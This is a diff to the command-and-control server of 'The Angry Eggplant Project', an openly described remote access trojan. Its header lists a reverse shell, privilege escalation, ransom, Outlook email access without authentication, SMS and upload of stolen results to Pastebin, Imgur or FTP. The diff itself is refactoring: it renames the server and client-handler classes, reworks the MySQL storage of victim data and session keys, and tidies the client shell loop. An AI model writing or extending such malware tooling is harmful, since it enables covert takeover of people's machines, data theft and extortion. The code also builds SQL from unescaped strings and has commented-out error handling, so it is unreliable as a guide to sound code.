@@ -3,10 +3,10 @@
 # https://github.com/colental/ae
 
 
-''' 
+'''
 
    The Angry Eggplant Project
-
+    
 >  30+ modules - interactive & automated
     - Reverse Shell   remotely access host machine with a shell
     - Root Acess      obtain administrator privileges
@@ -20,7 +20,7 @@
     - Upload          automatically upload results to Imgur, Pastebin, or a remote FTP server
     - Email           Outlook email of a logged in user can be accessed without authentication
     - SMS             Send & receive SMS text messages with user's contacts
-
+    
 >  Portability - supports all major platforms & architectures
     - no configuration - dynamically generates a unique client configured for the host
     - no dependencies - packages, interpreter & modules all loaded remotely
@@ -54,7 +54,7 @@ class ClientError(Exception):
     pass
 
 
-class Server(threading.Thread):
+class aeServer(threading.Thread):
     '''
     Copyright (c) 2017 Daniel Vega-Myhre
 
@@ -79,12 +79,10 @@ class Server(threading.Thread):
     SOFTWARE.
     '''
 
-    global server
-
     banner = open('../resources/banner.txt', 'r').read() if os.path.isfile('../resources/banner.txt') else str('\n' * 30 + '\tThe Angry Eggplant Project')
 
     def __init__(self, port=1337, debug=True, **kwargs):
-        super(Server, self).__init__()
+        super(aeServer, self).__init__()
         self.exit_status        = 0
         self.count              = 1
         self.clients            = {}
@@ -119,19 +117,17 @@ class Server(threading.Thread):
     def _print(self, info):
         if info and len(info):
             lock = self.lock if not self.current_client else self.current_client.lock
+            max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 80 else 80
+            max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 80 else 80
+            key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
+            keys    = {k: key_len[k] for k in sorted(key_len.keys())}
             with lock:
-                print('\n')
-                max_key = int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) if int(max(map(len, [str(i1) for i1 in info.keys() if i1 if i1 != 'None'])) + 2) < 40 else 40
-                max_val = int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) if int(max(map(len, [str(i2) for i2 in info.values() if i2 if i2 != 'None'])) + 2) < 40 else 40
-                print(self._text_color + colorama.Style.BRIGHT + 'Column'.center(max_key + 2) + 'Value'.center(max_val + 2))
-                key_len = {len(str(i2)): str(i2) for i2 in info.keys() if i2 if i2 != 'None'}
-                keys    = {k: key_len[k] for k in sorted(key_len.keys())}
                 for key in keys.values():
                     if info.get(key) and info.get(key) != 'None':
-                        if len(str(info.get(key))) > 40:
-                            info[key] = str(info.get(key))[:37] + '...'
+                        if len(str(info.get(key))) > 80:
+                            info[key] = str(info.get(key))[:77] + '...'
                         info[key] = str(info.get(key)).replace('\n',' ') if not isinstance(info.get(key), datetime.datetime) else str(v).encode().replace("'", '"').replace('True','true').replace('False','false') if not isinstance(v, datetime.datetime) else str(int(time.mktime(v.timetuple())))
-                        print(self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
+                        print('\x20' * 4 + self._text_color + self._text_style + key.ljust(max_key).center(max_key + 2) + info[key].ljust(max_val).center(max_val + 2))
 
     def _return(self, data=None):
         if not self.current_client:
@@ -165,7 +161,7 @@ class Server(threading.Thread):
             'help'          :   self.show_usage_help,
             'kill'          :   self.remove_client,
             'quit'          :   self.quit_server,
-            'query'         :   self.query_database,
+            'query'         :   self.database_query,
             'ransom'        :   self.ransom_client,
             'results'       :   self.show_task_results,
             'save'          :   self.save_task_results,
@@ -438,10 +434,11 @@ class Server(threading.Thread):
         print('\n')
         if isinstance(info, dict):
             if len(info):
-                self._print(info)
+                self._print(json.dumps(info))
         elif isinstance(info, list):
             if len(info):
                 for data in info:
+                    print(self._text_color + colorama.Style.BRIGHT + '\x20\x20%d\n' % int(info.index(data) + 1), end="")
                     self._print(data)
         elif isinstance(info, str):
             try:
@@ -585,68 +582,68 @@ class Server(threading.Thread):
         else:
             self._error("No client selected")
         try:
-            return self.query_database("SELECT * FROM tbl_tasks WHERE session='{}'".format(client.session).replace("Array\n(", "").replace("\n)", ""), display=False)
+            return self.database_query("SELECT * FROM tbl_tasks WHERE session='{}'".format(client.session).replace("Array\n(", "").replace("\n)", ""), display=False)
         except Exception as e:
             self._error("{} returned error: {}".format(self.show_task_results.func_name, str(e)))
     
     def save_task_results(self, task=None):
         try:
-            if task:
+            if isinstance(task, dict):
                 cmd, _, __  = bytes(task.get('command')).partition(' ')
                 if cmd in self.config['tasks']:
+                    value  = [task['client']]
+                    exists = self.database_query("select * from tbl_tasks where id='{}'".format(task['id']), display=False)
+                    if not exists:
+                        values = [task['task'], task['client'], task['session'], task['command'], task['result']]
                     try:
-                        value  = [task['client']]
-                        exists = self.database.callproc('sp_selectTasks', value)
-                        if not exists:
-                            values = [task['task'], task['client'], task['session'], task['command'], task['result']]
                             self.database.callproc('sp_addTask', values)
-                    except mysql.connector.InterfaceError: pass
-                    except Exception as e: print(str(e))
+                    except mysql.connector.InterfaceError:
+                        pass
+                    except Exception as e:
+                        if self._debug:
+                            self._error(str(e)) 
                 if self._debug:
-                    self.display("Database Updated")
-            else:
-                if self.current_client:
-                    self.send_client('show results', self.current_client.name)
-                    output = self.recv_client(self.current_client.name)
-                    client_results = output.get('result')
-                    server_results = self.database.query_database("SELECT * FROM tbl_tasks WHERE id='{}'".format(task['client']), display=False)
-                    if client_results and server_results:
-                        new_tasks  = set(server_results.keys()).symmetric_difference(set(client_results.keys()))
-                        for task in [cmd for cmd in new_tasks if cmd.get('command').partition(' ')[0] in self.config['tasks']]:
-                            try:
-                                self.database.callproc('sp_addTask', args=(task.get('task'), task.get('client'), task.get('session'), task.get('command'), task.get('result'), datetime.datetime.now()))
-                            except mysql.connector.InterfaceError: pass
-                            except Exception as e: print(str(e))
-                    self.display("Database updated")
+                    print(self._text_color + self._text_style + "Database Updated")
         except Exception as e:
             self._error("{} returned error: {}".format(self.save_task_results.func_name, str(e)))
 
-    def query_database(self, query, display=False):
+    def database_query(self, query, display=False):
         try:
+            self.database.reconnect()
             cursor = self.database.cursor(named_tuple=True)
             result = self._execute_sql(cursor, query)
-            print(result)
             if display:
                 for row in result:
                     self.display(json.dumps(row))
             return result
         except (mysql.connector.InterfaceError, mysql.connector.ProgrammingError):
+            print("Error: query failed - reconnecting...")
             self.database.reconnect()
-            return "Error: query failed - reconnecting..."
         except Exception as e:
-            self._error("{} error: {}".format(self.query_database.func_name, str(e)))
+            self._error("{} error: {}".format(self.database_query.func_name, str(e)))
+
+    def database_procedure(self, procedure, args=[], display=False):
+        try:
+            self.database.reconnect()          
+            cursor = self.database.cursor(dictionary=True)
+            cursor.callproc(procedure, args)
+            if display:
+                for result in cursor.stored_results():
+                    for row in result.fetchall():
+                        self.display(row)
+        except mysql.connector.InterfaceError:
+            pass
 
     def shell_handler(self):
         while True:
             connection, addr = self._sockets.shell.accept()
             private = Crypto.PublicKey.RSA.generate(2048)
             public  = private.publickey()
-            client  = ClientHandler(connection, address=addr, name=self.count, private_key=private, public_key=public)
+            client  = aeClient(connection, address=addr, name=self.count, private_key=private, public_key=public)
             self.clients[self.count] = client
             self.count  += 1
             client.start()
-            self.display(json.dumps(client.info))
-            print(self._prompt_color + self._prompt_style + str("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd() if not self.current_client else self.current_client.prompt % int(self.current_client.name)), end="")
+            print(self._prompt_color + self._prompt_style + str("[{} @ %s]> ".format(os.getenv('USERNAME', os.getenv('USER'))) % os.getcwd() if not self.current_client else str(self.current_client._prompt) % int(self.current_client.name)), end="")
 
     def task_handler(self):
         while True:
@@ -654,7 +651,7 @@ class Server(threading.Thread):
             client = None
             try:
                 for c in self.get_clients():
-                    if c.address[0] = addr[0]:
+                    if c.address[0] == addr[0]:
                         client = c
                 if client:
                     buf = ''
@@ -700,12 +697,12 @@ class Server(threading.Thread):
                 section, _, option   = resource.partition(' ')
                 result = ''
                 if request == 'api':
-                    if section and threads['server'].config.has_section(section):
+                    if section and server.config.has_section(section):
                         if not option:
-                            result = json.dumps(threads['server'].config[section])
+                            result = json.dumps(server.config[section])
                         else:
-                            if threads['server'].config[section].has_option(option):
-                                result = threads['server'].config[section].get(option)
+                            if server.config[section].has_option(option):
+                                result = server.config[section].get(option)
                             else:
                                 self._return("invalid API %s option requested: %s" % (section, option))
                                 continue
@@ -715,7 +712,7 @@ class Server(threading.Thread):
                          
                 elif request == 'resource':
                     if resource and resource in os.listdir('../resources'):
-                        result = open('../resources/%s' % threads['server'].config[request].get(resource)).read()
+                        result = open('../resources/%s' % server.config[request].get(resource)).read()
                     else:
                         self._return("invalid resource requested: %s" % resource)
                         continue
@@ -755,14 +752,14 @@ class Server(threading.Thread):
         sys.exit(0)
 
 
-class ClientHandler(threading.Thread):
+class aeClient(threading.Thread):
 
     global server
 
     _prompt     = None
 
     def __init__(self, connection, **kwargs):
-        super(ClientHandler, self).__init__()
+        super(aeClient, self).__init__()
         self.connection     = connection
         self.shell          = threading.Event()
         self.lock           = threading.Lock()
@@ -790,36 +787,31 @@ class ClientHandler(threading.Thread):
 
     def _kill(self):
         self.shell.clear()
-        threads['server'].remove_client(self.name)
-        threads['server'].current_client = None
-        threads['server'].shell.set()
-        threads['server'].run()
+        server.remove_client(self.name)
+        server.current_client = None
+        server.shell.set()
+        server.run()
 
     def _info(self):
         buf  = ''
         while '\n' not in buf:
             buf += self.connection.recv(1024)
-        text  = threads['server']._decrypt(buf.rstrip(), self.session_key)
+        text  = server._decrypt(buf.rstrip(), self.session_key)
         data  = json.loads(text.rstrip())
         if data.get('id'):
             client = data.get('id')
-            cursor = threads['server'].database.cursor(named_tuple=True)
-            cursor.execute("select * from tbl_clients where id='{}'".format(client))
-            select = cursor.fetchall()
+            select = server.database_query("select * from tbl_clients where id='{}'".format(client), display=False)
             if select:
                 print("\n\n" + colorama.Fore.GREEN  + colorama.Style.DIM + " [+] " + colorama.Fore.RESET + "Client {} has reconnected\n".format(self.name))
-                try:
-                    cursor.execute('UPDATE tbl_clients SET %s' % ("{}='{}'".format(attr,data[attr]) for attr in ['id','public_ip','local_ip',  'mac_address', 'username', 'administrator', 'device', 'platform', 'architecture']))
-                except mysql.connector.InterfaceError: pass
-                except Exception as e: print(str(e))
+                _ = server.database_query('UPDATE tbl_clients SET %s' % ("{}='{}'".format(attr,data[attr]) for attr in ['id','public_ip','local_ip',  'mac_address', 'username', 'administrator', 'device', 'platform', 'architecture']), display=False)
             else:
                 print("\n\n" + colorama.Fore.GREEN  + colorama.Style.BRIGHT + " [+] " + colorama.Fore.RESET + "New connection - Client {}: \n".format(self.name))
-                self.display(json.dumps(data))
+                server.display(json.dumps(data))
                 values = map(data.get, ['id', 'public_ip', 'local_ip', 'mac_address', 'username', 'administrator', 'device', 'platform', 'architecture'])
                 try:
-                    cursor.callproc('sp_addClient', values)
-                except mysql.connector.InterfaceError: pass
-                except Exception as e: print(str(e))
+                    server.database_procedure('sp_addClient', values)
+                except mysql.connector.InterfaceError:
+                    pass
         return data
             
     def _session_key(self):
@@ -839,21 +831,21 @@ class ClientHandler(threading.Thread):
     def _session(self):
         try:
             session_id  = Crypto.Hash.MD5.new(json.dumps(self.info.get('id')) + str(int(time.time()))).hexdigest()
-            ciphertext  = threads['server']._encrypt(session_id, self.session_key)
+            ciphertext  = server._encrypt(session_id, self.session_key)
             self.connection.sendall(ciphertext + '\n')
             values      = [session_id, self.info.get('id'), self.session_key, self.public_key.exportKey(), self.private_key.exportKey()]
-            cursor      = threads['server'].database.cursor(named_tuple=True)
+            cursor      = server.database.cursor(named_tuple=True)
             try:
                 cursor.callproc('sp_addSession', values)
-            except mysql.connector.InterfaceError: pass
-            except Exception as e: print(str(e))
+            except mysql.connector.InterfaceError:
+                pass
             ciphertext  = ""
             while "\n" not in ciphertext:
                 ciphertext += self.connection.recv(1024)
-            plaintext   = threads['server']._decrypt(ciphertext.rstrip(), self.session_key)
+            plaintext   = server._decrypt(ciphertext.rstrip(), self.session_key)
             request     = json.loads(plaintext)
             if request.get('request') == 'public_key':
-                response = threads['server']._encrypt(self.public_key.exportKey(), self.session_key)
+                response = server._encrypt(self.public_key.exportKey(), self.session_key)
                 self.connection.sendall(response + '\n')
             return session_id
         except Exception as e2:
@@ -865,54 +857,55 @@ class ClientHandler(threading.Thread):
 
     def prompt(self, data):
         with self.lock:
-            return raw_input(threads['server']._prompt_color + threads['server']._prompt_style + '\n' + bytes(data).rstrip())
+            return raw_input(server._prompt_color + server._prompt_style + '\n' + bytes(data).rstrip())
 
     def run(self):
         while True:
-            try:
+#            try:
+            if 1:
                 if self.shell.wait():
                     
-                    task = threads['server'].recv_client(self.name) if not self.prompt else self.prompt
+                    task = server.recv_client(self.name) if not self._prompt else self._prompt
 
                     if 'help' in task.get('command'):
                         self.shell.clear()
-                        threads['server'].show_usage_help(data=task.get('result'))
+                        server.show_usage_help(data=task.get('result'))
                         self.shell.set()
 
                     elif 'passive' in task.get('command'):
-                        threads['server']._print(task.get('result'))
+                        server._print(task.get('result'))
                         break
 
                     elif 'prompt' in task.get('command'):
+                        self._prompt = task
                         command = self.prompt(task.get('result') % int(self.name))
                         cmd, _, action  = command.partition(' ')
-                        if cmd in ('\n', ' '):
+                        if cmd in ('\n', ' ', ''):
                             continue 
-                        elif cmd in threads['server'].commands and cmd != 'help':
-                            self._prompt = task
-                            result = threads['server'].commands[cmd](action) if len(action) else threads['server'].commands[cmd]()
+                        elif cmd in server.commands and cmd != 'help':
+                            result = server.commands[cmd](action) if len(action) else server.commands[cmd]()
                             if result:
-                                threads['server']._print(result)
-                                threads['server'].save_task_results(task)
+                                server._print(result)
+                                server.save_task_results(task)
                             continue
                         else:
-                            threads['server'].send_client(command, self.name)
-
+                            server.send_client(command, self.name)
+                            
                     else:
                         if task.get('result') and task.get('result') != 'None':
-                            threads['server']._print(task.get('result'))
-                            threads['server'].save_task_results(task)
+                            server._print(task.get('result'))
+                            server.save_task_results(task)
                             
-                    if threads['server'].exit_status:
+                    if server.exit_status:
                         break
                     
                     self.prompt = None
                     
-            except Exception as e:
-                self._error(str(e))
-                time.sleep(1)
-                break
-        threads['server']._return()
+#            except Exception as e:
+#                self._error(str(e))
+#                time.sleep(1)
+#                break
+#        server._return()
 
 
 if __name__ == '__main__':
@@ -920,6 +913,6 @@ if __name__ == '__main__':
     threads = collections.namedtuple('Server', ['shell','resource','task'])
     port = int(sys.argv[1]) if len(sys.argv) > 1 else 1337
     debug = True if 'debug' in sys.argv else (True if '--debug' in sys.argv else False)
-    server = Server(port=port, debug=debug)
+    server = aeServer(port=port, debug=debug)
     server.start()
  
